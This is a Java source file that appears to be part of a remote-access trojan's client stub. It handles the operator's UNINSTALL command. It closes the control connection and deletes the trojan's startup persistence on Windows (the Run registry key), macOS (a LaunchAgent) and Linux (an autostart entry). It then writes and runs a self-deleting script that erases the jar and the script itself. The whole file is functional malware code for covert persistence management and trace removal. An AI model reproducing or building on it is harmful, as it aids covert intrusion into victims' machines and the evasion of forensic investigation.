package com.redpois0n.stub.packets.incoming;

import java.io.File;
import java.io.FileWriter;
import java.util.Random;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.WinRegistry;
import com.redpois0n.common.OperatingSystem;
import com.redpois0n.utils.Utils;

public class PacketUNINSTALL extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File me = Utils.getJarFile();

		try {
			Connection.socket.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		try {
			String fileName = Integer.toString( (new Random()).nextInt(10000));
			File file = null;
			String text = "";

			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Main.name);
				file = new File(fileName + ".bat");

				text += "pause\n";
				text += "del \"" + me.getAbsolutePath() + "\"" + "\n";
				text += "del %0";
				text = text.replace("\n", " & ");
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Main.name + ".plist");
				startupFile.delete();
				
				file = new File(fileName + ".sh");
				
				text += "#!bin/bash\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
				File startupFile = new File(System.getProperty("user.home") + "/.config/autostart/" + Main.name + ".desktop");
				startupFile.delete();
				
				file = new File(fileName + ".sh");
				
				text += "#!bin/bash\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			}

			if (file != null && text.length() > 0) {
				FileWriter writer = new FileWriter(file);
				writer.write(text);
				writer.close();

				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					Runtime.getRuntime().exec(new String[] { "cmd", "/c", file.getAbsolutePath() });
				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
					Runtime.getRuntime().exec(new String[] { "sh", file.getName() });
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		System.exit(0);
	}

}
